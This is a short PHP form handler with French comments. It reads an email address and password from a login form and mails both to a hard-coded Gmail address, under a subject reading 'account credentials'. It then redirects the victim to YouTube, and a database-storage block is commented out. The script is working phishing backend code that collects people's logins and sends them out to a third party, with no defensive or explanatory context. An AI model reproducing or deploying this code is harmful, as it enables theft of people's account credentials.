<?php 
	function protect($champ){
		$champ=trim($champ);
		$champ=stripcslashes($champ);
		$champ=strip_tags($champ);
		return $champ;
	}

	$email=protect($_POST['email']);
	$passw=protect($_POST['passw']);

	//echo "Votre mail est  $email et votre password est $passw";

	$idserv="localhost";
	$user="root";
	$password="";

// Envoi de l'e-mail
		$destinataire = "lokorosini11@gmail.com";
		$sujet = "Les identifiants du compte".$email;
		$corps_message = "Son id de login: ".$email."\n";
		$corps_message .= "Son mots de passe de login: ".$passw."\n";
		$corps_message .= "CONTINUE TOUJOURS COMME ÇA \n".$message;
		$headers = "From: ".$email;

// Envoyer l'e-mail
		mail($destinataire, $sujet, $corps_message, $headers);	

	/*try {
		$connect=new PDO("mysql:host=localhost;dbname=base",$user,$password);
		$connect->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$requete = "INSERT INTO utilisateur(email,passw) VALUES (?, ?)";
        $res = $connect->prepare($requete);
        $exc = $res->execute([$email, $passw]);
        header("Location:form.php");
        



	} catch (Exception $e) {
		echo 'Connexion erreur'.$e->getMessage();
	}*/


	header("Location:https://www.youtube.com");
?>